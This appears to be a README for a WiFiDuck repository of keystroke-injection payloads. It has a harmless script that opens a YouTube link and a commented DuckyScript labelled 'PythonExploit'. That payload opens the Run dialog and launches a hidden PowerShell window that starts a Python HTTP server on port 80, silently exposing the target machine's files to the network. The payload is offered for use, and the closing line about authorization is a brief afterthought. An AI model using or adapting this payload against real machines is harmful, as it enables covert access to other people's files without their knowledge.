# wifiduck
WifiDuck payloads

YouTube.txt
1. Open Google Chrome
2. Wait for Chrome to open (Delay: 2 seconds)
3. Press Enter (to confirm the selection of Chrome)
4. Wait for Chrome to fully load (Delay: 2 seconds)
5. Press Alt + D (to focus on the address bar)
6. Wait for the address bar to be focused (Delay: 2 seconds)
7. Type the URL "https://www.youtube.com/watch?v=xvFZjo5PgG0"
8. Press Enter

PythonExploit.txt
This payload script aims to execute a Python HTTP server exploit by leveraging PowerShell. It's important to note that this script assumes the target system has Python 3 installed.

Here's a breakdown of the payload:

DELAY 300                   # Delay for 300 milliseconds
GUI r                       # Simulate pressing Win + R to open the Run dialog
DELAY 100                   # Delay for 100 milliseconds
STRING powershell -w hidden python3 -m http.server 80  # Type the PowerShell command to start a Python HTTP server on port 80
DELAY 100                   # Delay for 100 milliseconds
ENTER                       # Simulate pressing Enter to execute the command

This script sequence opens the "Run" dialog by simulating the keystroke of Win + R, then enters a PowerShell command that starts a Python HTTP server on port 80. Finally, it simulates pressing Enter to execute the command.

However, please note that this script may not work as expected if Python 3 is not installed on the target system, and executing commands like this can raise security concerns. Always ensure that you have appropriate permissions and authorization before running such scripts.
